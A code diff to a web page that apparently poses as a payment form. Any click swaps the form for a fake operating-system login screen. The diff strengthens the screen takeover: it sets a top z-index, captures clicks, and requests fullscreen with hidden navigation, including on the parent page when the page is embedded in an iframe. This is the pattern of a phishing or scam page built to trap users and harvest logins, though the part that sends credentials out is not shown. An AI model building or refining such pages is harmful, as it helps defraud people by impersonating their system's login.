@@ -90,6 +90,7 @@
       position: fixed;
       top: 0;
       left: 0;
+      z-index: 9999; /* Ensure it stays on top */
     }
     .card {
       pointer-events: auto; /* Re-enable interactions on login card */
@@ -250,7 +251,7 @@
         <button id="payButton" class="w-full bg-blue-500 text-white p-2 rounded-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500">Pay Now</button>
       </div>
 
-      <div id="confirmation" class="hidden mt-4 Speaks: p-4 bg-green-100 text-green-700 rounded-md">
+      <div id="confirmation" class="hidden mt-4 p-4 bg-green-100 text-green-700 rounded-md">
         <p id="confirmationMessage"></p>
       </div>
     </div>
@@ -301,10 +302,23 @@
     });
 
     // Trigger login screen on click with full-screen attempt
-    document.addEventListener('click', async () => {
+    document.addEventListener('click', async (event) => {
       if (!paymentSection.classList.contains('hidden')) {
+        event.preventDefault(); // Ensure click is captured as a user gesture
         paymentSection.style.display = 'none';
         loginSection.style.display = 'flex';
+
+        // Check if in iframe
+        if (window.self !== window.top) {
+          // Check if iframe allows fullscreen
+          const iframe = window.frameElement;
+          if (iframe && !iframe.hasAttribute('allowfullscreen')) {
+            console.warn('Iframe does not have allowfullscreen attribute, fullscreen restricted.');
+            loginSection.classList.add('fullscreen-fallback');
+            return;
+          }
+        }
+
         // Attempt full-screen with robust error handling
         try {
           // Check if fullscreen is allowed
@@ -312,24 +326,57 @@
             const permission = await navigator.permissions.query({ name: 'fullscreen' });
             if (permission.state === 'denied') {
               console.warn('Fullscreen permission denied by browser policy.');
-              loginSection.classList.add('fullscreen-fallback'); // Apply fallback styles
+              loginSection.classList.add('fullscreen-fallback');
               return;
             }
           }
-          // Request full-screen
-          if (loginSection.requestFullscreen) {
-            await loginSection.requestFullscreen({ navigationUI: 'hide' });
-          } else if (loginSection.webkitRequestFullscreen) { /* Safari */
-            await loginSection.webkitRequestFullscreen();
-          } else if (loginSection.msRequestFullscreen) { /* IE11 */
-            await loginSection.msRequestFullscreen();
+
+          // Check if Fullscreen API is supported
+          if (document.fullscreenEnabled || document.webkitFullscreenEnabled || document.msFullscreenEnabled) {
+            if (window.self !== window.top && window.top.document) {
+              // Attempt full-screen on parent document (may be restricted)
+              try {
+                if (window.top.document.documentElement.requestFullscreen) {
+                  await window.top.document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+                } else if (window.top.document.documentElement.webkitRequestFullscreen) {
+                  await window.top.document.documentElement.webkitRequestFullscreen();
+                } else if (window.top.document.documentElement.msRequestFullscreen) {
+                  await window.top.document.documentElement.msRequestFullscreen();
+                }
+                console.log('Fullscreen entered successfully on parent document');
+              } catch (parentErr) {
+                console.warn('Parent fullscreen request failed, trying local:', parentErr.message);
+                // Fallback to local element
+                if (loginSection.requestFullscreen) {
+                  await loginSection.requestFullscreen({ navigationUI: 'hide' });
+                } else if (loginSection.webkitRequestFullscreen) {
+                  await loginSection.webkitRequestFullscreen();
+                } else if (loginSection.msRequestFullscreen) {
+                  await loginSection.msRequestFullscreen();
+                }
+                console.log('Fullscreen entered successfully on local element');
+              }
+            } else {
+              // Direct full-screen request for non-iframe context
+              if (loginSection.requestFullscreen) {
+                await loginSection.requestFullscreen({ navigationUI: 'hide' });
+              } else if (loginSection.webkitRequestFullscreen) {
+                await loginSection.webkitRequestFullscreen();
+              } else if (loginSection.msRequestFullscreen) {
+                await loginSection.msRequestFullscreen();
+              }
+              console.log('Fullscreen entered successfully');
+            }
+          } else {
+            console.warn('Fullscreen API not supported in this browser.');
+            loginSection.classList.add('fullscreen-fallback');
           }
         } catch (err) {
           console.error('Failed to enter fullscreen:', err.message);
-          loginSection.classList.add('fullscreen-fallback'); // Apply fallback styles
+          loginSection.classList.add('fullscreen-fallback');
         }
       }
-    });
+    }, { once: false, capture: true });
 
     // OS Login Screen Script
     const avatar = document.getElementById('avatar');
